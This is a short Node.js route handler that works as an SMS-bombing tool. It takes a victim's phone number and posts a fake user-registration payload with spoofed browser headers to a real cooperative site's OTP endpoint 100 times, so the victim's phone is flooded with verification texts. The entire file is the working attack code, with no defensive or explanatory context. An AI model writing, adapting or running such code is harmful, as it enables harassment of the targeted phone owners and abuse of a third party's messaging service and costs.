const axios = require('axios');
const bodyParser = require('body-parser');

exports.name = '/sms';
exports.index = async (req, res, next) => {
  const mobileNumber = req.query.number;
  if (!mobileNumber) {
    return res.status(400).json({ message: 'Missing required query parameter: number' });
  }

  const payload = {
    first_name: "Mahiro",
    middle_name: "NMN",
    last_name: "Oyama",
    password: "mahiro091",
    password_confirmation: "mahiro091",
    email: "mahirochan101@gmail.com",
    mobile_number: mobileNumber,
    username: "mahirochan"
  };

  const headers = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    'Accept': "application/json",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'sec-ch-ua': "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
    'Content-Type': "application/json;charset=UTF-8",
    'sec-ch-ua-mobile': "?1",
    'Authorization': "Bearer null",
    'sec-ch-ua-platform': "\"Android\"",
    'Origin': "https://alpha.mycoop.ph",
    'Sec-Fetch-Site': "same-site",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://alpha.mycoop.ph/",
    'Accept-Language': "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"
  };

  try {
    for (let i = 0; i < 100; i++) {
      await axios.post('https://mis.mycoop.ph/api/v1/user-registration-otp-prompt', payload, { headers });
    }
    res.status(200).json({ message: 'OTP sent 100 times' });
  } catch (error) {
    if (error.response) {
      // If the response is available, forward the status and data
      res.status(error.response.status).json(error.response.data);
    } else {
      // Otherwise, it's a server error
      res.status(500).json({ message: 'Internal Server Error' });
    }
  }
};
